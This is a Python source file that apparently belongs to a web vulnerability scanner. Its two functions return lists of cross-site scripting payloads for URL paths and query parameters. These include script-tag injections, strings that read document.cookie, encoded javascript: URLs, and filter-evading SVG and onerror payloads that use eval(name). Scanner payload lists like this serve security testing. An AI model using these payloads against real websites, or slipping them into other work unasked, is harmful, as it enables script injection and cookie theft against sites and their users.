def generate_payloads_for_dirs():
    payloads_for_dirs = [
        # From Aurora Project
        "121;alert(1)//678",
        "gb44d><script>alert(1)</script>axm7cgi45yi",
        "12126&apos;;alert(1)//678",
        "pebma\"-alert(1)-\"t17n0",
        "12126&apos;;alert(1)//678"
    ]

    return payloads_for_dirs


def generate_payloads_for_params():
    payloads_for_params = [
        # Basics
        "<script>prompt(5000/200)</script>",
        "<script>alert(6000/3000)</script>",
        "<script>alert(document.cookie)</script>",
        "<script>prompt(document.cookie)</script>",
        "<script>console.log(5000/3000)</script>",

        # From Aurora Project
        "121;alert(1)//678",
        "gb44d><script>alert(1)</script>axm7cgi45yi",
        "12126&apos;;alert(1)//678",
        "pebma\"-alert(1)-\"t17n0",
        "12126&apos;;alert(1)//678",

        # From Eugen
        "<a href=javas&#99;ript:alert(1)>",
        "`\"'><img src=xxx:x onerror\x0B=javascript:alert(1)>",
        "<b>1234",
        "<x>%00%00%00%00%00%00%00<script>alert(1)</script>",
        "<script>alert(1)%0d%0a-->%09</script>",
        "<svg><animate xlink:href=#x attributeName=href values=&#106;avascript:alert(1) /><a id=x><rect width=100 height=100 /></a>",
        "<script src=\"data:,alert(1)%250A-->",
        "<script>alert(xss)</script>",
        "javascript:/*--></marquee></script></title></textarea></noscript></style></xmp>\">[img=1]<img -/style=-=expression&#40/*’/-/*',/**/eval(name)//);width:100%;height:100%;position:absolute;behavior:url(#default#VML);-o-link:javascript:eval(title);-o-link-source:current name=alert(1) onerror=eval(name) src=1 autofocus onfocus=eval(name) onclick=eval(name) onmouseover=eval(name) background=javascript:eval(name)//>\""

    ]

    return payloads_for_params
